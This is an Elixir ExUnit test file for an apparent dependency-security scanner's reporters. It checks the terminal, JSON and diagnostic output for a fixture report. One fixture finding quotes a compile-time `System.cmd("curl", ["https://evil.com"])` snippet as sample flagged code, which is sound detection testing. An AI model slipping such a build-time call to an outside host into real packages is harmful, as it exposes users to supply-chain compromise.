defmodule VetReporter.Integration.OutputTest do
  use ExUnit.Case, async: true

  alias VetCore.Types.{ScanReport, DependencyReport, Dependency, Finding}

  setup do
    report = %ScanReport{
      project_path: "/tmp/test_project",
      timestamp: DateTime.utc_now(),
      dependency_reports: [
        %DependencyReport{
          dependency: %Dependency{name: :risky_dep, version: "0.1.0", source: :hex},
          findings: [
            %Finding{
              dep_name: :risky_dep,
              file_path: "/tmp/test_project/deps/risky_dep/lib/risky.ex",
              line: 3,
              column: 5,
              check_id: :system_exec,
              category: :system_exec,
              severity: :critical,
              compile_time?: true,
              snippet: ~s|@cmd System.cmd("curl", ["https://evil.com"])|,
              description: "Call to System.cmd/2,3 — executes an external system command"
            },
            %Finding{
              dep_name: :risky_dep,
              file_path: "/tmp/test_project/deps/risky_dep/lib/risky.ex",
              line: 7,
              column: 5,
              check_id: :env_access,
              category: :env_access,
              severity: :warning,
              compile_time?: false,
              snippet: ~s|System.get_env("HOME")|,
              description: ~s|Call to System.get_env("HOME") — reads an environment variable|
            }
          ],
          risk_score: 55,
          risk_level: :high
        },
        %DependencyReport{
          dependency: %Dependency{name: :safe_dep, version: "2.0.0", source: :hex},
          findings: [],
          risk_score: 0,
          risk_level: :low
        }
      ],
      summary: %{
        total_deps: 2,
        total_findings: 2,
        deps_by_risk_level: %{high: 1, low: 1},
        highest_risk_dep: :risky_dep,
        highest_risk_score: 55,
        critical_count: 0,
        high_count: 1
      }
    }

    %{report: report}
  end

  describe "VetReporter.Terminal.render/1" do
    test "produces terminal output", %{report: report} do
      output = capture_io(fn -> VetReporter.Terminal.render(report) end)

      assert output =~ "Vet"
      assert output =~ "risky_dep"
      assert output =~ "safe_dep"
      assert output =~ "System.cmd"
      assert output =~ "/tmp/test_project"
    end
  end

  describe "VetReporter.Json.render/1" do
    test "produces valid JSON output", %{report: report} do
      output = capture_io(fn -> VetReporter.Json.render(report) end)

      assert {:ok, parsed} = Jason.decode(output)
      assert is_map(parsed)
      assert parsed["project_path"] == "/tmp/test_project"
      assert is_list(parsed["dependencies"])
      assert length(parsed["dependencies"]) == 2
    end
  end

  describe "VetReporter.Json.encode/1" do
    test "returns parseable JSON string", %{report: report} do
      json_string = VetReporter.Json.encode(report)

      assert is_binary(json_string)
      assert {:ok, parsed} = Jason.decode(json_string)
      assert parsed["project_path"] == "/tmp/test_project"
    end

    test "JSON round-trip preserves fields", %{report: report} do
      json_string = VetReporter.Json.encode(report)
      {:ok, parsed} = Jason.decode(json_string)

      # Verify top-level fields
      assert parsed["project_path"] == "/tmp/test_project"
      assert is_binary(parsed["timestamp"])

      # Verify summary
      assert parsed["summary"]["total_deps"] == 2
      assert parsed["summary"]["total_findings"] == 2

      # Verify dependency reports
      [risky, safe] =
        Enum.sort_by(parsed["dependencies"], fn d -> d["risk_score"] end, :desc)

      assert risky["name"] == "risky_dep"
      assert risky["version"] == "0.1.0"
      assert risky["risk_score"] == 55
      assert risky["risk_level"] == "high"
      assert length(risky["findings"]) == 2

      first_finding = hd(risky["findings"])
      assert first_finding["check_id"] == "system_exec"
      assert first_finding["category"] == "system_exec"
      assert first_finding["severity"] == "critical"
      assert first_finding["compile_time"] == true
      assert first_finding["line"] == 3

      assert safe["name"] == "safe_dep"
      assert safe["risk_score"] == 0
      assert safe["risk_level"] == "low"
      assert safe["findings"] == []
    end
  end

  describe "VetReporter.Diagnostics.render/1" do
    test "produces diagnostic output", %{report: report} do
      output = capture_io(fn -> VetReporter.Diagnostics.render(report) end)

      assert output =~ "error:"
      assert output =~ "warning:"
      assert output =~ "[vet:system_exec]"
      assert output =~ "[vet:env_access]"
      assert output =~ "risky.ex:3"
      assert output =~ "risky.ex:7"
    end
  end

  defp capture_io(fun) do
    ExUnit.CaptureIO.capture_io(fun)
  end
end
